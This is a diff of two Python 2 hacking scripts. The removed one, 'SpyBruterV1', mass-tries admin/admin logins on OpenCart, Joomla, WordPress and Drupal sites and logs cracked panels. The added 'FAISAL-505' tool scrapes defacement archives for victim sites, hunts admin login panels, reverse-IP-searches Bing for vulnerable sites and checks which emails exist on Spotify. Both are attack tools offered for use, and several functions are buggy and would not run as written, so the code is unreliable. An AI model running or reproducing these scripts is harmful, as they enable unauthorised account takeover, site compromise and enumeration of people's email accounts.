@@ -1,267 +1,527 @@
-import cookielib
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+
+#Ne touche pas le script -_-
+#Don't Edit Logo -_-
+
+
+import requests, httplib, urllib
+import socket
+from platform import system
 import os
-import random
+import sys, time
 import re
-import requests
-import sys
-import time
-import urllib
-import urllib2
-from multiprocessing.dummy import *
+import threading
+from multiprocessing import Pool
+from colorama import Fore								
+from colorama import Style								
+from colorama import init												
+init(autoreset=True)
+fr  =   Fore.RED
+fh  =   Fore.RED
+fc  =   Fore.CYAN
+fo  =   Fore.MAGENTA
+fw  =   Fore.WHITE
+fy  =   Fore.YELLOW
+fbl =   Fore.BLUE
+fg  =   Fore.GREEN											
+sd  =   Style.DIM
+fb  =   Fore.RESET
+sn  =   Style.NORMAL										
+sb  =   Style.BRIGHT
 
-from colorama import *
-#Like always , hey , do you think i hate you ?  no really no , i really don't give a fuck abt u xD
-la7mar = '\033[91m'
-lazra9 = '\033[94m'
-la5dhar = '\033[92m'
-movv = '\033[95m'
-lasfar = '\033[93m'
-ramadi = '\033[90m'
-blid = '\033[1m'
-star = '\033[4m'
-bigas = '\033[07m'
-bigbbs = '\033[27m'
-hell = '\033[05m'
-saker = '\033[25m'
-labyadh = '\033[00m'
-cyan = '\033[0;96m'
-init()
-#before writing your fucking name try to see ur fucking self in the mirror :)
-if not os.path.exists("Cms"):
-    os.mkdir("Cms", 0755)
-class SpyBruterV1:
-    def __init__(self):
-            clear = "\x1b[0m"
-            colors = [31, 32, 33, 34, 35, 36, 37, 38, 39]
-            x = """
+user = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"}
 
-   _____             ____             _            
-  / ____|           |  _ \           | |           
- | (___  _ __  _   _| |_) |_ __ _   _| |_ ___ _ __ 
-  \___ \| '_ \| | | |  _ <| '__| | | | __/ _ \ '__|
-  ____) | |_) | |_| | |_) | |  | |_| | ||  __/ |   
- |_____/| .__/ \__, |____/|_|   \__,_|\__\___|_|   
-        | |     __/ |                              
-        |_|    |___/                 v1              
-                        CodedBy Mister Spy
-                          icq: 712083179
-                          Site:tshop.to                        
-    """
-            for N, line in enumerate(x.split("\n")):
-                sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
-                time.sleep(0.05)
+url = "http://www.zone-h.org/archive/notifier="
+urll = "http://zone-h.org/archive/published=0"
+url2 = "http://www.defacers.org/onhold!"
+url4 = "http://www.defacers.org/gold!"
+my_cook = {
+	"ZHE" : "4e272d65712d4668b216595185f47c7d",
+	"PHPSESSID" : "0pg7okq5lbhj7o699c5amut5a1"
+	}
 
 
-            list = raw_input('List of Sites : ')
-            url = open(list, 'r').readlines()
-            ThreadPool = Pool(20)
-            ThreadPool.map(self.cms, url)
+def zonehh():
+	print("""
+	    |---| Grabb Sites From Zone-h |--|
+		\033[91m[1] \033[95mGrabb Sites By Notifier
+		\033[91m[2] \033[95mGrabb Sites By Onhold
+		""")
+	sec = int(raw_input("Choose Section: "))
+	if sec == 1:
+		notf = raw_input("\033[95mEntre notifier: \033[92m")
 
-    def cms(self, url):
-        try:
-            url = url.replace('\n', '').replace('\r', '')
-            op = requests.get(url+'/admin',timeout=7)
-            op2 = requests.get(url + '/administrator/index.php',timeout=7)
-            op3 = requests.get(url + '/wp-login.php',timeout=7)
-            op4 = requests.get(url + '/admin',timeout=7)
-            if "dashboard" in op.text:
-                print "[+] OPencarte", url + labyadh + '\n'
-                open("Cms/Opencarte.txt", "a").write(url + '\n')
-                self.opencart(url)
-            elif "Joomla" in op2.text:
-                print "[+] Joomla", url + labyadh + '\n'
-                open("Cms/Joomla.txt", "a").write(url + '\n')
-                self.joomla(url)
-            elif "WordPress" in op3.text:
-                print "[+] Wordpress", url + labyadh + '\n'
-                open("Cms/wordpress.txt", "a").write(url + '\n')
-                self.wpbrute(url)
-            elif "sites/default" in op4.text:
-                print   "[+] Drupal", url + labyadh + '\n'
-                open("Cms/drupal.txt", "a").write(url + '\n')
-                self.Drupal(url)
+		for i in range(1, 51):
+			dz = requests.get(url + notf +"/page=" + str(i), cookies=my_cook)
+			dzz = dz.content
+			print(url + notf +"/page=" + str(i))
+			if '<html><body>-<script type="text/javascript"' in dzz:
+				print("Change Cookies Please")
+				sys.exit()
+			elif '<input type="text" name="captcha" value=""><input type="submit">' in dzz:
+				print("Entre Captcha In Zone-h From Ur Browser :/")
+				sys.exit()	
+			else:
+				Hunt_urls = re.findall('<td>(.*)\n							</td>', dzz)
+				if '/mirror/id/' in dzz:
+					for xx in Hunt_urls:
+						qqq = xx.replace('...','')
+						print '    ['  + '*' + '] ' + qqq.split('/')[0]
+						with open( notf + '.txt', 'a') as rr:
+							rr.write("http://" + qqq.split('/')[0] + '\n')
+				else:
+					print("Grabb Sites Completed !!")
+					sys.exit()
+					
+	elif sec == 2:
+		print(":* __Grabb Sites By Onhold__ ^_^")
+		for qwd in range(1, 51):
+			rb = requests.get(urll + "/page=" + str(qwd) , cookies=my_cook)
+			dzq = rb.content
 
+			if '<html><body>-<script type="text/javascript"' in dzq:
+				print("Change Cookies Plz")
+				sys.exit()
+				
+			elif "captcha" in dzq:
+				print("Entre captcha In Your Browser Of Site [zone-h.org]")
+			else:
+				Hunt_urlss = re.findall('<td>(.*)\n							</td>', dzq)
+				for xxx in Hunt_urlss:
+					qqqq = xxx.replace('...','')
+					print '    ['  + '*' + '] ' + qqqq.split('/')[0]
+					with open('onhold_zone.txt', 'a') as rrr:
+						rrr.write("http://" + qqqq.split('/')[0] + '\n')
+	else:
+		print("Fuck You Men")
 
-            else:
-                print '[-] Cms Not Found -->' + url + '\n'
-
-        except:
-            print
-
-    def joomla(self,url):
-        try:
-
-            Agent = {
-                'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
-
-            admins = ['admin']
-            passwords = ['admin']
-
-            jo_lib = requests.session()
-
-            for admin in admins:
-                for pwdjox in passwords:
-                    pwdjoxz = pwdjox.strip()
-                    jo_lib1 = jo_lib.get(url + '/administrator/index.php',timeout=7)
-
-                    token = re.findall('type="hidden" name="(.*?)" value="1"', jo_lib1.content)
-
-                    jo_logs = {'username': admin,
-                               'passwd': pwdjoxz,
-                               token[0]: '1',
-                               'lang': 'en-GB',
-                               'option': 'com_login',
-                               'task': 'login',
-                               'return': 'aW5kZXgucGhw'}
-
-                    req_jo = jo_lib.post(url + '/administrator/index.php', data=jo_logs, headers=Agent,timeout=7)
-
-                    if 'New Article' in req_jo.content:
-
-                        jo_check = jo_lib.get(url + '/administrator/index.php?option=com_plugins',timeout=7)
-
-                        if 'New Article' in jo_check.content:
-                            print lasfar + '-----------------------------------------Joomla-----------------------------------------' + labyadh + '\n'
-                            print la5dhar + '[+] Cracked Success Joomla --> ' + url + '|' + admin + '|' + pwdjoxz + labyadh + '\n'
-                            print lasfar + '------------------------------------------------------------------------------------------' + labyadh + '\n'
-                            open('Cracked.txt', 'a').write(
-                                url + '/administrator/index.php ' + '|' + admin + '|' + pwdjoxz + ' [#]Joomla \n')
-
-                        else:
-                            print '[-] Failed Joomla -->' + url + '|' + admin + ';' + pwdjoxz + labyadh + '\n'
-
-                    else:
-                        print '[-] Failed Joomla -->' + url + '|' + admin + ';' + pwdjoxz + labyadh + '\n'
-
-
-
-        except:
-            pass
-
-
-    def opencart(self,url):
-        try:
-            cr = open('Cracked.txt', 'a')
-            passlist = ["admin"]
-            for passwordx in passlist:
-                passwd = passwordx.strip()
-                # print passwd
-                cookies = {
-                    'OCSESSID': '41793cc49288925a72df1b7b5c',
-                    'language': 'en-gb',
-                    'currency': 'IDR',
-                }
-
-                data = {
-                    'username': 'admin',
-                    'password': passwd
-                }
-                r = requests.get(url + "/admin/index.php",timeout=7)
-                if "https://" in r.url:
-                    url = url.replace("http://", "https://")
-                else:
-                    pass
-                s = requests.Session()
-                r = s.post(url + '/admin/index.php', cookies=cookies, data=data,timeout=7)
-
-                if 'common/logout' in r.text:
-                    print lasfar + '-----------------------------------------OpenCart-----------------------------------------' + labyadh + '\n'
-                    print lazra9 + '[+] Cracked Success OpenCart--> ' + url + '|admin|' + passwd + labyadh + '\n'
-                    print lasfar + '------------------------------------------------------------------------------------------' + labyadh + '\n '
-                    cr.write(url + '/admin |admin|' + passwd + ' [#]OpenCart\n')
-                    break
-                else:
-                    print '[-] Failed  OpenCart --> ' + url + '|admin|' + passwd + labyadh + '\n'
-            return 0
-        except:
-            print 'Contact Mister Spy '
-
-    #add timeout , if you raeding this i just want to say hello , hope you are fine , and go to hell ,
-    def wpbrute(self,url):
-        try:
-            user = "admin"
-            passlist = ["admin"]
-            for password in passlist:
-                password = password.strip()
-                try:
-                    cj = cookielib.CookieJar()
-                    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
-                    login_data = urllib.urlencode({'log': user, 'pwd': password})
-                    opener.open(str(url) + '/wp-login.php', login_data)
-                    resp = opener.open(str(url) + '/wp-admin')
-                    final = resp.read()
-                    if '<li id="wp-admin-bar-logout">' in final:
-                        print lasfar + '-----------------------------------------Wordpress-----------------------------------------' + labyadh + '\n'
-                        print la5dhar + "[+] Cracked Success Wp--> " + str(
-                            url) + '/wp-login.php|' + user + '|' + password + labyadh + '\n'
-                        print lasfar + '--------------------------------------------------------------------------------------------' + labyadh + '\n'
-                        with open('Cracked.txt', 'a') as myfile:
-                            myfile.write(str(url) + 'wp-login.php' + ' |' + user + '|' + password + ' [#]Wordpress \n')
-                        break
-                    else:
-                        print '[-] Failed  Wordpress --> ' + url + '|admin|' + password + labyadh + '\n'
-                except:
-                    pass
-        except:
-            pass
-
-    def Drupal(self,url):
-        passlist = ["admin"]
-
-        Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
-
-        for password in passlist:
-            password = password.strip()
-            try:
-
-                lib = requests.session()
-
-                Getcsrf = lib.get(url + '/?q=user',timeout=7)
-
-                # Get Token
-                Token1 = re.findall('"form_build_id" value="(.*?)" />', Getcsrf.content)
-                Token2 = re.findall('type="hidden" name="form_id" value="user(.*?)" />', Getcsrf.content)
-                Token3 = re.findall('id="edit-submit" name="op" value="(.*?)" class="', Getcsrf.content)
-                Token4 = re.findall('name="op" id="edit-submit" value="(.*?)" class="', Getcsrf.content)
-
-                # Data Tokens
-
-                Tokenk = []
-                Tokenk.append(Token3)
-                Tokenk.append(Token4)
-
-                for tok3 in Tokenk:
-                    tok3 = tok3
-                    for tok4 in tok3:
-                        Tokens = tok4
-                # You Can add Any User u Want ^^
-
-                user = 'admin'
-                bdaa0x = {'name': user,
-                       'pass': password,
-                       'form_build_id': Token1[0],
-                       'form_id': 'user' + str(Token2[0]),
-                       'op': Tokens
-                       }
-
-                req = lib.post(url + '/?q=user', data=bdaa0x, headers=Headers,timeout=7)
+def defacers():
+	print("""
+		|---| Grabb Sites From Defacers.org |--|
+			\033[91m[1] \033[95mGrabb Sites By Onhold
+			\033[91m[2] \033[95mGrabb Sites By Archive
+		""")
+	sec = int(raw_input("Choose Section: "))
+	if sec == 1:
+		for i in range(1, 380):
+			print("Page: "), str(i) + "\033[91m Waiting Grabbed Sites .....  <3"
+			rb = requests.get(url2 + str(i),headers=user)
+			okbb = rb.content
+			domains = re.findall(r'title=".*" tar.?', okbb)
+			for iii in domains:
+				iii = iii.replace('" target="_blank" reel="nofollow">', "")
+				iii = iii.replace('title="', "")
+				iii = iii.replace('" targ', "")
+				print("\033[95mhttp://" + iii + "/")
+				with open("Onhold_defacer.txt", "a") as by:
+					by.writelines("http://" + iii + "/")
+					by.writelines("\n")
+			print ("\t\t[+] Page Saved_"),str(i) +(" done [+]\n")
+	elif sec == 2:
+		for i in range(1, 25):
+			print("Page: "), str(i) + " \033[91mWaiting Grabbed Sites Governement .....  <3"
+			rb = requests.get(url4 + str(i),headers=user)
+			okbb = rb.content
+			domains = re.findall(r'title=".*" tar.?', okbb)
+			for iii in domains:
+				iii = iii.replace('" target="_blank" reel="nofollow">', "")
+				iii = iii.replace('title="', "")
+				iii = iii.replace('" targ', "")
+				print("\033[95mhttp://" + iii + "/")
+				with open("govSites_defacer.txt", "a") as by:
+					by.writelines("http://" + iii + "/")
+					by.writelines("\n")
+			print ("\t\t[+] Page Saved_"),str(i) +(" done [+]\n")
+	else:
+		print("Fuck You Men 2")
 
 
-                if '"user/logout"' in req.content:
-                    open('Cracked.txt', 'a').write(url + '/?q=user' + '|' + Users + '|' + passwd + '\n')
-                    print lasfar + '-----------------------------------------Drupal-----------------------------------------' + labyadh + '\n'
-                    print la5dhar + "[+] Cracked Success Drupal--> " + url + '/admin|' + user + '|' + password + labyadh + '\n'
-                    print lasfar + '--------------------------------------------------------------------------------------------' + labyadh + '\n'
+def mirroirh():
+	print("""
+		   |---| Grabb Sites From Mirror-h.org |--|
+			\033[91m[1] \033[95mGrabb Sites By Onhold
+			\033[91m[2] \033[95mGrabb Sites By Auto_Notifier
+		""")
+	sec = int(raw_input("Choose Section: "))
+	if sec == 1:
+		url = "https://mirror-h.org/archive/page/"
+		try:
+			for pp in range(1, 40254):
+				dz = requests.get(url + str(pp))
+				dzz = dz.content
+				qwd = re.findall(r'/zone/(.*)</a></td>', dzz)
+				print(" \033[91m[*] Please Wait To Grabb Sites ...... Page: "), pp
+				for ii in qwd:
+					ii = ii.replace('<i class="icon-search"></i>', "")
+					ii = ii.replace(ii[:10], "")
+					ii = ii.replace("\r\n\r\n", "\r\n")
+					ii = ii.strip()
+					#iio = ii.replace('<i class="icon-search"></i>', "hhhhhhhhhhhhh")
+					print("\033[95m" + ii)
+					with open( 'onzeb_mirror.txt', 'a') as rr:
+						rr.write(ii + '\n')
+		except:
+			pass
+	elif sec == 2:
+		url = "https://mirror-h.org/search/hacker/" 
+		try:
+			for ha in range(1, 2000):
+				print("\033[91mWait To Grabb From Hacker: "), ha
+				dz = requests.get(url + str(ha) + "/pages/1")
+				dzz = dz.content
+				qwd = re.findall(r'/pages/\d" title="Last"', dzz)
+				for i in qwd:
+					i = i.rstrip()
+					sss = i.replace("/pages/","")
+					ss = sss.replace('" title="Last"',"")
+					ssf = int(ss) + 1
+					for ii in range(1, ssf):
+						print(" \033[91m[*] Please Wait To Grabb Sites ...... Page: "), ii
+						dd = requests.get(url + str(ha) + "/pages/"+ str(ii))
+						op = dd.content
+						qwdd = re.findall(r'/zone/(.*)</a></td>', op)
+						for idi in qwdd:
+							idi = idi.replace('<i class="icon-search"></i>', "")
+							idi = idi.replace(idi[:10], "")
+							idi = idi.replace("\r\n\r\n", "\r\n")
+							idi = idi.strip()
+							#iio = ii.replace('<i class="icon-search"></i>', "hhhhhhhhhhhhh")
+							print("\033[95m" + idi)
+							with open( 'top_mirror.txt', 'a') as rr:
+								rr.write(idi + '\n')
+		except:
+			pass
 
-                else:
-                    print '[-] Failed  Drupal --> ' + url + '|admin|' + password + labyadh + '\n'
 
-            except:
-                pass
+def overflowzone():
+	print("""
+		|---| Grabb Sites From overflowzone.com |--|
+			\033[91m[1] \033[95mGrabb Sites By Onhold
+			\033[91m[2] \033[95mGrabb Sites By AutoNotifier
+		""")
+	sec = int(raw_input("Choose Section: "))
+	if sec == 1:
+		url = "http://attacker.work/onhold/onhold/page/"
+		dz = requests.get(url + "1")
+		dzz = dz.content
+		tn = re.findall(r'<a href="/onhold/page/(.*)" title="Last">', dzz)
+		for ii in tn:
+			qwd = ii.split('/')[-1]
+			for ok in range(1, int(qwd)):
+				okk = requests.get(url + str(ok))
+				print("`\t\t\t" + url + str(ok))
+				fel = okk.content
+				okkk = re.findall(r'">http://(.*)</a></td>', fel)
+				for iii in okkk:
+					iii = iii.rstrip()
+					print("\033[95mhttp://" + iii.split('/')[0])
+					with open( 'onhold_attackerwork.txt', 'a') as rr:
+						rr.write("http://" + iii.split('/')[0] + '\n')
+	elif sec == 2:
+		url = "http://attacker.work/archive/page/"
+		dz = requests.get(url + "1")
+		dzz = dz.content
+		tn = re.findall(r'<a href="/archive/page/(.*)" title="Last">', dzz)
+		for ii in tn:
+			qwd = ii.split('/')[-1]
+			for ok in range(1, int(qwd)):
+				okk = requests.get(url + str(ok))
+				print("`\t\t\t" + url + str(ok))
+				fel = okk.content
+				okkk = re.findall(r'">http://(.*)</a></td>', fel)
+				for iii in okkk:
+					iii = iii.rstrip()
+
+					print("\033[95mhttp://" + iii.split('/')[0])
+					with open( 'archive_attackerwork.txt', 'a') as rr:
+						rr.write("http://" + iii.split('/')[0] + '\n')
+	else:
+		print("hhhhhhhh tnkt")
+def bYPAS():
+	exploit = ["/member/","/admin/login.php","/admin/panel.php","/admin/","/login.php","/admin.html","/admin.php","/admin-login.php"]
+	try:
+		q = raw_input('\033[96m Entre Liste Site: \033[90m ')
+		q = open(q, 'r')
+	except:
+		print("\033[91mEntre List Sites -_- #Noob ")
+		sys.exit()
+	for lst in q:
+		lst = lst.rstrip()
+		print("\033[94m 	Wait Scaning ....... \033[94m"), lst
+		for exploits in exploit:
+			exploits.rstrip()
+			try:
+				if lst[:7] == "http://":
+					lst = lst.replace("http://","")
+				if lst[:8] == "https://":
+					lst = lst.replace("https://", "")
+				if lst[-1] == "/":
+					lst = lst.replace("/","")
+				socket.setdefaulttimeout(5)
+				conn = httplib.HTTPConnection(lst)
+				conn.request("POST", exploits)
+				conn = conn.getresponse()
+				htmlconn = conn.read()
+				if conn.status == 200 and ('type="password"') in htmlconn:
+					print("\033[92m [+] Admin Panel [+] ======\033[96m=======> \033[96m ") , lst + exploits
+					with open("admin_panels.txt", "a") as by:
+						by.writelines(lst + exploits + "\n")
+				else:
+					print("\033[91m [-] Not Found : [-]"),lst + exploits
+			except:
+				pass
+
+def add_http():
+	dz = raw_input("Entre List Site: ")
+	dz = open(dz, "r")
+	for i in dz:
+		i = i.rstrip()
+		print("http://"+i)
+		with open( 'aziz.txt', 'a') as rr:
+			rr.write("http://" + i + '\n')
+	print("Text Saved !!")
+
+def binger():
+	qwd = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"}
+
+	print("""
+		\033[91m[1] \033[95mGrabb Sites By Ip List
+		\033[91m[1] \033[95mGrabb Sites Fox_Contact And Bypass By Ip List
+		""")
+	o = int(raw_input("Choose Section: "))
+	if o == 1:
+		gr = raw_input('Give me List Ip: ')
+		gr = open(gr,'r')
+		for done in gr:
+		    remo = []
+		    page = 1
+		    while page < 251:
+		        bing = "http://www.bing.com/search?q=ip%3A"+done+"+&count=50&first="+str(page)
+		        opene = requests.get(bing,verify=False,headers=qwd)
+		        read = opene.content
+		        findwebs = re.findall('<h2><a href="(.*?)"', read)
+		        for i in findwebs:
+		            o = i.split('/')
+		            if (o[0]+'//'+o[2]) in remo:
+		                pass
+		            else:
+		                remo.append(o[0]+'//'+o[2])
+		                print '{}[XxX] '.format(fg,sb),(o[0]+'//'+o[2])
+		                with open('Grabbed.txt','a') as s:
+		                    s.writelines((o[0]+'//'+o[2])+'\n')
+		        page = page+5
+	elif o == 2:
+		qwd = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"}
+		gr = raw_input('Give me List Ip: ')
+		gr = open(gr,'r')
+		for done in gr:
+		    remo = []
+		    page = 1
+		    print("Wait Grabb Sites From iP: "), done
+		    while page < 251:
+		        bing = "http://www.bing.com/search?q=ip%3A"+done + " powered by fox_contact"+"+&count=50&first="+str(page)
+		        opene = requests.get(bing,verify=False,headers=qwd)
+		        read = opene.content
+		        findwebs = re.findall('<h2><a href="(.*?)"', read)
+		        for i in findwebs:
+		            o = i.split('/')
+		            if (o[0]+'//'+o[2]) in remo:
+		                pass
+		            else:
+		                remo.append(o[0]+'//'+o[2])
+		                print '[XxX] ' + (o[0]+'//'+o[2])
+		                with open('foxcontact.txt','a') as s:
+		                    s.writelines((o[0]+'//'+o[2])+'\n')
+		        page = page+5
+
+		        bing = "http://www.bing.com/search?q=ip%3A"+done + " admin/login.php"+"+&count=50&first="+str(page)
+		        opene = requests.get(bing,verify=False,headers=qwd)
+		        read = opene.content
+		        findwebs = re.findall('<h2><a href="(.*?)"', read)
+		        for i in findwebs:
+		            o = i.split('/')
+		            if (o[0]+'//'+o[2]) in remo:
+		                pass
+		            else:
+		                remo.append(o[0]+'//'+o[2])
+		                dd = requests.get(o[0]+'//'+o[2] + "/admin/login.php")
+		                ddd = dd.content
+		                if 'type="password"' in ddd:
+		                	print("\033[92mAdmin_Panel Site: >>>>>>\033[91m"),o[0]+'//'+o[2] + "/admin/login.php"
+		                	with open('admin panel.txt','a') as s:
+		                		s.writelines((o[0]+'//'+o[2])+'\n')
+		   		page = page+5
+	else:
+		print("dir numero azbi nooooooob")
+
+
+def cms_detected(i):
+	lst = raw_input("Entre List Site: ")
+	lst = open(lst, 'r')
+	for i in lst:
+		i = i.rstrip()
+		print("\033[91m[+] \033[95mPlease Waiting To Scaning ... "), "\033[94m" + i + " \033[91m[+]"
+		try:
+			dz = requests.get(i, timeout=0.5)
+			ok = dz.content
+					#---------OPENCARTE-----------------------
+			if "index.php?route" in ok:
+				print("\033[92mOpenCart Site: >>>>>>>>>>>>>>\033[91m"), i + "/admin/"
+				with open("OpenCart sites.txt", "a") as opncrt:
+					opncrt.writelines(i + "/admin/"+ "\n")
+					#---------------------------------
+			else:
+				print("\033[91m[-] Not Found Cms: [-]"), "\033[91m" + i
+		except:
+			pass
 
 
 
+def spotii():
+	#url =  "https://www.spotify.com"
+
+	rl = "http://www.spotify.com/us/xhr/json/isEmailAvailable.php?signup_form[email]="
+
+	try:
+		ok = raw_input("{}root@kil3r~# Entre List Email: ".format(fy,sn))
+		okd = open(ok, 'r')
+	except:
+		print("{}zebi  entre list  email -_- nooob").format(fh,sn)
+	for i in okd:
+		i = i.rstrip()
+		qwd = url + i + "&email=" + i
+		dz = requests.get(qwd, headers=user)
+		dzz = dz.content
+		if 'false' in dzz:
+			print("{}   [LIVE]     ".format(fg,sn)), "{}".format(fg,sn) + i
+			with open("spotify checked.txt", "a") as zebi:
+				zebi.writelines(i + '\n')
+		else:
+			print("{}   [DEAD]     ").format(fh,sn), "{}".format(fh,sn) + i
 
 
 
-SpyBruterV1()
+def clearscrn():
+    if system() == 'Linux':
+        os.system('clear')
+    if system() == 'Windows':
+        os.system('cls')
+        os.system('color a')
+clearscrn()
+
+def slowprint(s):
+    for c in s + '\n':
+        sys.stdout.write(c)
+        sys.stdout.flush()
+        time.sleep(4. / 100)
+
+def helper4():
+   
+	clearscrn()
+	banner = """\033[94m
+              +o//s--`                          
+                      .:shyddmNNhy/                         
+                      `/yydmNNNmNmy/.                       
+                     +odMNdNMMMMNmd+/                       
+                      sydNNNmNMmhy++.                       
+                       .-ohsNMN/h--                         
+                          ..sNo``                           
+                             h/                             
+                            `Ny                             
+                            `Mh                             
+              `-/oyyo/.   --:Mh---   -+sys+:.               
+                   `:ohds-+yshsh+:/sdy/.                    
+                       `+dmo.  -sdy:                        
+                          .smsdh:`                          
+                        `:`/yyhy/`-                         
+                    .o--/mNd.  /NNh::/s                     
+                     +yss/`:   .--+ooo-
+	"""
+	print("""\033[95m
+               +o//s--`                          
+                      .:shyddmNNhy/                         
+                      `/yydmNNNmNmy/.                       
+                     +odMNdNMMMMNmd+/                       
+                      sydNNNmNMmhy++.                       
+                       .-ohsNMN/h--                         
+                          ..sNo``                           
+                             h/                             
+                            `Ny                             
+                            `Mh                             
+              `-/oyyo/.   --:Mh---   -+sys+:.               
+                   `:ohds-+yshsh+:/sdy/.                    
+                       `+dmo.  -sdy:                        
+                          .smsdh:`                          
+                        `:`/yyhy/`-                         
+                    .o--/mNd.  /NNh::/s                     
+                     +yss/`:   .--+ooo-
+                                  Script Name : FAISAL-505 ^_^
+								  
+                my snap :fs.hack   my insta:fs.hack
+                                     """)
+	slowprint("\n\t\t\t\t\Telegram By :@FAISAL-505  " + "\n\t\t\t\t\t\t            ")
+	print("")
+	print("""
+		\033[91m[1] \033[95mGrabb Sites  \033[92m From Zone-h.org   |  \033[91m[3] \033[95mGrabb Sites  \033[92m From mirror-h.org     |
+		\033[91m[2] \033[95mGrabb Sites  \033[92m From Defacers.org |  \033[91m[4] \033[95mGrabb Sites  \033[92m From overflowzone.com |
+		
+		\033[91m[5] \033[95mGet Sites bypass With List [Bypass Finder]
+		\033[91m[6] \033[95mMass Add (http://) To List ^_^
+		\033[91m[7] \033[95mGrabber Sites From Bing :D
+		\033[91m[8] \033[95mCms Filtre
+		\033[91m[9] \033[95mEmail Valid Spotify
+
+
+			#######################################################
+			# 	  Love 4 KSA |\033[91m| Live 4 KSA        #
+			#######################################################
+			""")		
+	try:
+		qq = int(raw_input("\033[91m[-] \033[90mroot@kil3r~# \033[92mChoose Section !!\033[95m : \033[90m"))
+		if qq == 1:
+			clearscrn()
+			print(banner)
+			zonehh()
+		if qq == 2:
+			clearscrn()
+			print(banner)
+			defacers()
+		if qq == 3:
+			clearscrn()
+			print(banner)
+			mirroirh()
+		if qq == 4:
+			clearscrn()
+			print(banner)
+			overflowzone()
+		if qq == 5:
+			clearscrn()
+			print(banner)
+			bYPAS()
+		if qq == 6:
+			clearscrn()
+			print(banner)
+			add_http()
+		if qq == 7:
+			clearscrn()
+			print(banner)
+			binger()
+		if qq == 8:
+			clearscrn()
+			print(banner)
+			cms_detected()
+		if qq == 9:
+			clearscrn()
+			print(banner)
+			spotii()
+
+	except:
+		pass
+helper4()
+try:
+    p = Pool(150)
+    p.map(cms_detected, lst)
+except:
+    pass
